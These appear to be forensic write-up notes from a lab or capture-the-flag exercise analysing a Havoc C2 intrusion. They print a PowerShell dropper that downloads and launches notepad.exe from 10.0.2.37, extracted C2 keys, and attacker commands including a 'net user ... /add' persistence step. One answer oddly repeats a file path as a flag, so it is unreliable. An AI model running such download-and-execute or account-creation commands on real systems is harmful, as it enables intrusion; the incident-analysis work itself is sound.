- **install.ps1**

![[../../Image/Pasted image 20250423091359.png]]

```
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
$65lmAtnzW8 = New-ObjectSystem.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
Start-Process -Filepath $LA4rJgSPpx
```
- **Object list:**
![[../../Image/Pasted image 20250423095009.png]]
- **notepad.exe**
![[../../Image/Pasted image 20250423100437.png]]
- **Havoc Artifact** from network traffic
```
[+] Parsing Request
[+] Found Havoc C2
  [-] Agent ID: 0e9fb7d8
  [-] Magic Bytes: deadbeef
  [-] C2 Address: http://10.0.2.37/
  [+] Found AES Key
    [-] Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
    [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
```
## IOCs
#### **IP Address:**
- hxxp[:]//10.0.2.37
#### **File:**
- /install.ps1
- /notepad.exe
- /notepad.exe

---
## Answer the question

- What is the SID of the user that the attacker is executing everything under?

![](../../Image/Pasted%20image%2020250423101528.png)

- What is the Link-local IPv6 Address of the server? Enter the answer exactly as you see it.

![](../../Image/Pasted%20image%2020250423105228.png)
=> **fe80::e134:1b0c:c8d5:3020%6**

- The attacker printed a flag for us to see. What is that flag?

![](../../Image/Pasted%20image%2020250423105244.png)

- The attacker added a new account as a persistence mechanism. What is the username and password of that account? Format is **username:password** 

![](../../Image/Pasted%20image%2020250423105304.png)
```
dir C:\Users\paco\Desktop\
type C:\Users\paco\Desktop\Files\clients.csv
ipconfig
net user administrator WfD3hz3AXZ4n /add
```

- The attacker found an important file on the server. What is the full path of that file?

![](../../Image/Pasted%20image%2020250423105347.png)
=> **C:\Users\paco\Desktop\Files\clients.csv**

- What is the flag found inside the file from question 5?

![](../../Image/Pasted%20image%2020250423105335.png)
=> **C:\Users\paco\Desktop\Files\clients.csv**

